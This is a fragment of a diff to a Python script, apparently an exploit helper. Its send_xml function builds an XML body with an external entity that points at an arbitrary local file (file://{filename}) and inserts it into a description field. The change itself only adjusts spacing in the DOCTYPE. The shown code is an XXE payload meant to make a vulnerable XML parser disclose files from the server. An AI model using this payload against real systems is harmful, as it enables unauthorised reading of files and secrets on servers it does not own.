@@ -8,7 +8,7 @@ import sys
 
 def send_xml(filename):
     xml = f'''<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{filename}">] >
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{filename}"> ]>
 <example>
   <title></title>
   <description>&xxe;</description>
